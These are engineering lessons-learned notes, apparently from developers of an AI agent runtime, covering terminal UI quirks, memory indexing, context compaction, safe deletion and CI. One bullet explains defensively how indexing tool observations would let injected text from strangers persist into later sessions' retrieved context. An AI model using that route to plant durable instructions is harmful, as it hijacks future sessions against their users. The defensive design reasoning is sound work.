- **`live` accumulates across steps, so committing it once at `turn.end` destroys the turn's chronology.**
  A multi-step turn came out "every tool row, then all the reasoning, then all the text" — the reasoning
  that *decided* to call a tool printed below that tool's result, and step one's reasoning concatenated onto
  step two's with nothing marking the join (`…look for it in my workspace.The user is asking me to…`).
  `model.result` fires once per model call and is therefore the boundary; no new event was needed. Related:
  the turn's stats then need a `turnFrom` floor recorded at `turn.start`, or a turn that produced no text
  hangs its cost on the *previous* turn's reply and that reply reads as having cost twice.
- **When a constraint is lifted, the code written around it does not announce itself.** `tool.result`
  appended a second item because `<Static>` had already written the first and editing a written node
  silently does nothing — and the comment said exactly that, a phase after `<Static>` was removed. Four rows
  per tool call where one would do. Grep for the comment explaining a workaround, not for the workaround.
  Pair a result to its call on `callId`: calls overlap, so "the last tool row" is not the row it belongs to.
- **Ink hands a mouse report to `useInput` as text, and strips one leading escape from the chunk.** With
  tracking on, a wheel notch reached the insert branch and its report was typed into the message — so a
  guard is not an optimisation, and it must claim clicks and releases too, because a click that falls
  through is the same bug with a different button. Two measured facts, each a debugging round: the strip
  happens at `ink/build/hooks/use-input.js:97`, so the **first** report in a chunk arrives bare and the rest
  keep their escape — requiring the prefix matched none of them; and the notch **count** matters, because a
  flick of the wheel is coalesced into one chunk and honouring one report moves a single row. Recognise X10
  as well as SGR: a terminal that ignored the SGR request replies in X10, whose bytes are routinely above
  127. The cost is stated rather than hidden — tracking is what stops the terminal handling the mouse, so
  drag-select is gone while a session is mounted, and shift bypasses it in every terminal worth naming.
- **Read the raw bytes off the pty, not only the rendered screen.** `DISABLE_MOUSE` shipped with its second
  escape as the literal text `ESC`, because a substitution had caught one per string and not both. Every
  symptom is silent: the sequence is *printed* somewhere in the frame, the terminal is left in an encoding
  nobody asked for, and the wheel still appears to work because the parser accepts both encodings. A
  rendered grid cannot show it; `repr()` of the last few hundred bytes shows it immediately. A test now
  asserts each constant holds exactly two escape **bytes** and no `ESC` letters.
- **A `flexGrow` spacer above the composer is right with a conversation and wrong without one.** On the
  landing screen the transcript held a five-line banner in a fourteen-row window, so twelve blank rows sat
  between the banner and the input on a thirty-row terminal — a third of the screen, reading as half-empty
  rather than as a prompt waiting for you. The slack goes *below* the composer while landing. In the same
  frame the banner's first row duplicated the sticky header exactly, brand, version, agent and model, three
  rows apart: the rich path drops it and anything genuinely absent from the header (`window`) moves down a
  line. The plain path keeps the row, because it has no header and that is the only place the version
  appears — so the fix belongs at the `seed()` call, not in the line builder both paths share.
- **`includeHistory` indexes messages with *no* `origin` — an allowlist of prose, never a blocklist of tool
  output.** The runtime stamps everything it authored (`observation`, `call`, `repair`, `digest`), so the
  allowlist excludes a fifth kind added later by default. Inverting it is not a style choice: `observation`
  holds text a stranger wrote, and indexing that makes prompt injection **durable** — retrieved into slot 7
  in a later session, long after the write gate that fenced it stopped applying. Related trap: under NLT an
  assistant message that called a tool carries its prose *and* the `ACTION` block in one `origin: "call"`
  row. The **index** still excludes it and that is a choice rather than an omission: `exchanges` pairs a
  question with its final answer, so hundreds of near-identical "let me look that up" passages would only
  move every document frequency and could be mistaken for the reply in a turn that ended on a tool call.
  The **screen** does not exclude it any more. A live session shows that narration as it streams, so
  omitting it made a resumed conversation a different transcript of the same turn from the one that had
  been on screen — `proseOf` strips the block at *read* time, which needs no stored field (a conditional
  spread on `ChatMessage` is the shape that has cost six rounds) and works on rows already written.
  `lib/resume.ts` owns which origins count, extracted from `run` precisely because four chained lambdas
  inside a function needing a live runtime is how that filter shipped wrong twice.
- **Memory has two reconciliation namespaces and `reconcile` drops whatever it was not handed.** That drop
  is a feature — it is how a deleted archive file stops being retrieved — and it is why `syncFiles` and
  `syncSessions` are separate functions over `session:<key>` and everything else. Recall syncs files every
  turn; conversations are indexed at turn end. One shared pass would delete every indexed conversation on
  the next turn, and the symptom is memory that works right after a rebuild and stops a turn later, with
  nothing throwing. For the same reason `rebuildMemory` restores **both** unconditionally rather than
  behind a `--history` flag: `clear` wipes both, so an opt-in would make a plain rebuild delete every
  conversation and report success. `enumerateFiles` refuses a memory file named `session:*.md`, which
  would otherwise be dropped by whichever pass ran second and re-added by the other, forever.
- **A retrieved conversation excerpt needs a different sentence from a retrieved note, and slot 2 needs a
  memory row.** Both were measured on the same live agent, and both are the "a fact with no frame is a fact
  a small model will not connect to a question" lesson again. With one frame for both, an agent holding
  three excerpts of its own earlier sessions answered correctly and then added *"that's what the saved
  notes say; the actual transcripts don't carry over"* — wrong about its own state, while holding the
  evidence. Fixing the frame moved the *reasoning* ("all from conversations on 2026-08-19") and left the
  reply's claim intact, because slot 2 had no `memory` row: with nothing telling it otherwise the model
  fell back on what a stateless assistant is right to assume. Both together, and the claim went away. The
  row is trimmed hard — slot 2 is billed every turn of every session, `context.test.ts` caps the block, and
  a new capability is a legitimate reason to grow it while a wordier sentence is not.
- **`memory.budget` and `maxActive` are sized for the *largest* passage kind, because `selectPassages`
  stops at the first that does not fit.** It never skips past — deliberately, so a short worse-ranked entry
  cannot displace a long better-ranked one — which means an oversized passage does not merely go
  uninjected, it sits at the top of the ranking and blocks everything behind it. So indexing conversations
  *required* 600 → 2000 rather than merely benefiting from it: an exchange bills near 370 tokens against a
  note bullet's handful. Each side of an exchange is capped for the same reason, and truncating there is
  legitimate where truncating a workspace file is not — `messages` is canonical and the indexed document is
  a projection, so a capped passage still carries the stamp and source needed to find the whole thing.
- **A message rendered into markdown must be collapsed to one line first.** The indexed document is fed to
  `splitPassages`, which reads a line beginning `- ` as a new passage and `#` as a heading — so a person's
  message containing either *becomes structure*, splitting one exchange into several or hanging a heading
  over unrelated notes. Collapsing whitespace per message removes the class rather than escaping cases, and
  the test writes the hostile message rather than trusting the argument.
- **`StoredMessage` never declared `origin` while `toMessage` had always set it.** A conditional spread is
  not excess-property-checked, so the field arrived at runtime and was invisible to every reader's types —
  anything filtering a page by origin silently compared `undefined`. That is the **sixth** time this exact
  shape has cost a round here (`apiKeyEnv`, `ChatMessage.toolCalls`, `TurnInput.skills`,
  `ToolContext.readArtifact`, `ToolContext.memoryDir`). Corollary learned writing the tests for it: an `as
  never` cast on a test fixture defeats the check that would have caught the field name being wrong, which
  is the one place that check is cheapest.
- **One `store.db` per sandbox root, every table keyed by `agent_id` — so isolation is a property of the
  queries, not of the filesystem.** Which means "removing one agent leaves another's data alone" is a
  thing to *assert*: a `DELETE` missing its `WHERE agent_id = ?` passes every test that only ever puts
  one agent in the store, which is every test anybody writes by default. `store-purge.test.ts` populates
  two. Two consequences already load-bearing elsewhere: `memory_fts*` shadow tables are shared, which is
  why ranking is computed in `rank/bm25.ts` rather than through FTS5's `bm25()`; and `kv` is the one
  table with no `agent_id` **and no consumer anywhere**, so `purgeAgent` cannot clean up after it — dead
  vocabulary, the `includeHistory` shape again, and now documented as such on the interface.
- **The store, the logs and the launchd label are keyed by the manifest `id`; the directory is keyed by
  its own name.** They are usually equal and need not be. Two directories with one id share one
  conversation history — `listAgents` already warned about it, and it is why `remove` *refuses* rather
  than deleting: the delete would take the other agent's sessions and memory and report success. Any new
  command that touches an agent's data has to decide which of the two names it means.
- **A destructive command's confirmation must be the same code path as its `--dry-run`.** Two
  derivations of "what would go" is how a confirmation comes to describe something other than what
  happens — and for an irreversible command that means the person read it, agreed, and got something
  else. `remove-plan.ts` renders one listing and both callers print it. Related: the bar is the agent's
  name typed back (`askExactly`), not `y`, because a keypress against the wrong listing is one keystroke
  from deleting conversations nothing recovers — and the listing is only worth printing if something
  makes somebody read it. Not a TTY means no in both prompts, so a piped run without `--yes` is a no-op.
- **A command that deletes takes a *ref*, never a path.** `run ./somewhere/agent.yaml` is a real thing
  to want; `remove ./somewhere` is one bad tab-completion from recursively deleting whatever was on the
  command line. `remove` refuses a path by name and points at `rm -rf` as the honest alternative.
- **Deletion order is the safety, and the irreplaceable thing goes last.** Stop the process (the
  graceful path is the only one that reaps backgrounded `exec` children), unload *and disable* the
  service, purge rows, delete logs, delete the directory. Every step but the last is recoverable — an
  agent whose rows are gone still loads and still runs — so a failure part-way leaves something that
  works. The reverse order leaves a manifest-less agent whose data is unreachable and whose name
  nothing can name. `removalSteps` is pure so the order is asserted without performing it.
- **A step budget is not a plan, and the guard against a loop is repetition.** `init` wrote `maxSteps:
  6` and justified it in its own comment — "a two-tool chain needs five steps… one spare" — which is the
  budget for answering a question. Live, `create a sample pdf` spent six *productive* steps and died one
  step before succeeding, its reply ending on "Let me install it". Four numbers disagreed (schema 12,
  `init` 6, reference 8, minimal 4), which is itself the tell that none was reasoned. 40 now, with
  `limits.noProgress.identicalCalls` as the real guard: a small cap and a repetition check both stop a
  loop, and only one of them also stops recovery.
- **How the loop exited is recorded, never inferred.** `steps >= maxSteps` is true both for a turn the
  budget stopped and for an answer arriving exactly on the last permitted step, so it cannot decide
  between them — `answered` is set at the one break that means the work is done. The old
  `pendingWork || text === ""` reached the right verdict on every case that mattered; it is gone
  because it asked about the model's sentence to learn about the loop. **Corollary about research: the
  "max_steps misfiled as final" defect reported during planning was not real.** The reporting gap under
  it was, and a plausible mechanism traced through source is still a hypothesis until the store agrees.
- **`stats.reason` reached the transcript and was rendered nowhere, and that was the whole bug.** In the
  TUI a turn stopped by its budget was pixel-identical to a completed one; the plain path had a sentence
  for `max_steps` and printed it only when the reply was *empty*; `channels.ts:363` returns on empty text,
  so a cut turn with no prose delivered **nothing at all** to Telegram. `endNote` is in **core** because
  the channel path needs it too — three callers, one formatter — and `endedBadly` is `!== "final" &&
  !== "stopped"` so a new reason cannot exit 0 by omission. Related: the plain path filtered
  `agent.warning` to the single code `manifest_changed`, hiding every other warning ever added.
- **An error constructor nobody calls is a hint nobody reads.** `turnTimeout` and `turnStopped` were
  written in Phase 1, hints included, and never invoked — grep found only the definitions. So a
  timed-out turn had `status: "timeout"`, three empty error columns, one parenthesis of output, and
  **exit 0**. Grep for callers of an `errors.ts` factory before assuming a failure path reports itself.
- **Compaction never drops what the person said, and that is arithmetic rather than policy.** Measured
  on a real 47-message session: observations **83.9%** of history bytes, assistant prose 12.6%, tool
  calls 3.2%, everything the person typed **0.3%** — 423 bytes of 150 KB. Deleting all of it frees
  nothing and costs the only record of the task, in a session full of `"continue"` and `"yes"` that
  oldest-first *kept* while dropping the instruction. One predicate, `isTurnStart`, shared by the
  ladder's `trim` and `assembleContext`'s blunt trim — two definitions is how one path honoured the rule
  while the other, on the same session a moment later, did not. Found live, not by reading.
- **The ladder is ordered by information destroyed, not bytes freed — and that ordering is forced.**
  `snip .60 → micro .70 → collapse .80 → reset .88 → trim .95`. `snip`/`micro` leave an `artifact_read`
  pointer, `collapse`/`reset` leave meaning as a digest, `trim` leaves nothing, so `trim` is last despite
  freeing the most; its gentle name is exactly why it was misplaced. The forced part: with `trim` third,
  `collapse` and `reset` **could never fire** — they only run when `trim` failed to reach target, which
  means `trim` had already stripped history to the request spine, and a digest *plus* the preserved spine
  is never smaller than the spine alone. Measured 8316 → 7860 → 5064, then both `changed=false` at 495.
  **Summarising must precede destroying or the summary has no subject.**
- **Reordering `STAGE_ORDER` moves two invariants nobody names.** `runLadder` *replaces* the displacement
  map with whatever a stage returns, and `trim` reindexes — so `trim` running third with an empty map
  strands every artifact `snip` and `micro` recorded, leaving live `artifact_read` pointers to ids
  `persist()` was never asked to write. And a digest is not a turn start, so an unprotected one is the
  first thing `trim` eats. Both were silent; both are now guarded by tests that go red with the fix
  reverted. Also: `TRIM_MARGIN` was a fact about the *floor* named after a stage, and `validate.ts` kept
  a hand-copied `THRESHOLD_ORDER` that silently described a ladder that no longer existed.
- **`this.window` is main's window, and the compactor is a different model.** Thirteen lines in
  `agent.ts` had three defects: `requestParamsFor(compactor, this.window)`, no bound on the span against
  `compactor.capabilities.contextWindow`, and `signal: new AbortController().signal` — never aborted, so
  a hanging compactor outlived both the turn signal and `turnTimeoutMs`. `roles.ts` calls a cheap
  compactor beside a large main "the intended production shape and usually the biggest available cost
  win", which is precisely the configuration that overflows: it threw, `digestFor` caught it, the ladder
  fell back to `mechanicalDigest`, and `digestSource: "mechanical"` was reported to nobody. **The
  recommended cost optimisation had never once worked.** Guarded by reading the digest request's body.
- **Two things may pass the prompt budget; nothing may pass the window in silence.** The current turn's
  own trace and the person's requests are kept past `promptBudget`, because the alternative is a model
  reasoning about a tool result absent from its own prompt — `reserveOutput` is a reserve being spent.
  The window is not a reserve: measured live at a declared 6,000, a 12-step turn assembled **6,743**
  tokens and was simply sent. An endpoint whose real window matched would have refused it. The rescue is
  capped at the window and `prompt_over_window` names three remedies.
- **A new `TurnEndReason` needs a store migration, and SQLite cannot alter a CHECK constraint.**
  `turns.status` is `TEXT NOT NULL CHECK (status IN (…))`, so `truncated` and `no_progress` needed
  migration 7 to create-copy-drop-rename. Nothing references `turns` (`messages.turn_id` is a plain
  column), which is what makes that safe — and the indexes go with the table, including the *partial* one
  on `running`, without which crash recovery at boot degrades from an index scan to a full scan of every
  turn ever taken, silently and only on a large store.
- **`docs/04-SPEC-WIRE.md` carried six rows for events that do not exist or have different fields.** A
  second `context.pressure` naming `used`/`window`, a second `compaction.stage` naming `dropped`, a
  `context.reset` naming `sessionKey`, a duplicate `phase.changed`, and `skill.selected`/`skill.none`,
  which have never existed at all — sitting below the accurate rows in the *same table*, so anything
  written against them read `undefined` from a documented field. Check a spec table against
  `events/types.ts` before trusting it.
- **`bun link` points at the checkout, and `bin` points at `dist/`.** So a collaborator must build
  *before* linking or the symlink dangles, and `bun run build` must build every workspace package the
  binary imports or the command runs yesterday's provider code from a stale `dist`. Both were
  undocumented until the README grew a setup section; the second is already a recorded hazard, and it
  presents as "your change is correct, the test fails, and the stack trace points into `dist`".
- **CI has no `dist/`, so `build` runs second — after `lint` and before everything else.** The
  workflow was ordered "cheapest-first so a lint error does not wait on a build", which is right about
  lint and wrong about the rest: every sibling import resolves through that package's `dist/`, so on a
  fresh checkout `typecheck` reports **79** `TS2307: Cannot find module '@dispach/core'` and `bun test`
  **34** module-resolution errors — the merge gate red for nine days, on a tree where both commands
  pass locally. That is the inverse of the recorded stale-`dist` hazard and it hides better: a stale
  `dist` fails a test, an absent one fails a command that has nothing to do with the change, and the
  local run cannot reproduce it because an earlier build already left the directory there. **Verify a
  workflow change against a fresh clone, never against your working tree.**
- **A CI job with no `timeout-minutes` is bounded by GitHub's six-hour ceiling, twice per matrix leg.**
  A hang in `test under node` burned 6 h × 2 on every push for five days, reported as `cancelled`,
  which reads as somebody's own doing. The bound is structural for the same reason `KeepAlive:
  {Crashed: true}` is: a fault that stops once gets looked at, and one that retries forever gets a log
  nobody opens. `test:node` also carries `--test-timeout`, so a hanging *test* is named and the rest of
  the suite still runs — without it Node's runner stops dispatching at the hung file, and every file
  after it in the glob is silently never run, which is indistinguishable in the log from a suite that
  ended there.
- **A memory query's *plan* is pinned with a unary `+`, because three SQLite versions disagree and the
  slow one sits between the two fast ones.** `memory_passages_source` indexes `(agent_id, source)`, so
  given `WHERE memory_fts MATCH ? AND p.agent_id = ?` a planner may enter through the agent filter and
  probe the virtual table once per row it finds — `SCAN f VIRTUAL TABLE INDEX 0:=M1`, where the `=` is
  SQLite telling you it is a per-row probe. Measured over 5,000 passages, `:memory:`, same code: 3.51.0
  (bun) **0.7 ms**, 3.51.3 (node 22) **260 ms**, 3.53.3 (node 24) **0.7 ms**. So it is not a version to
  wait out, and the cost is linear in corpus size — it gets worse exactly as an agent remembers more.
  `+p.agent_id` suppresses index use on that one term and pins `SCAN f` on all three. Corollary that
  cost a round: **the plan assertion cannot fail under `bun test`**, because bun already chooses right,
  so the guard also asserts the `+` in the SQL text. A guard that can only go red on the
  `continue-on-error` leg is the "passes with the fix reverted" shape again.
- **A wall-clock assertion in the unit suite fails under load, and load is what CI is.** `index cold in
  under 50 ms and cached in under 5 ms` passes on an idle machine and fails 2 runs in 3 with four
  builds running beside it — which is a shared 2-core runner every time. Its own comment says the
  criterion "gets renegotiated, not relaxed quietly", which is right and is why the number cannot just
  be raised: `evals/` and `bench:boot` are where a measurement belongs, and a unit test's job is that
  fifty skills load and the second scan is cached.
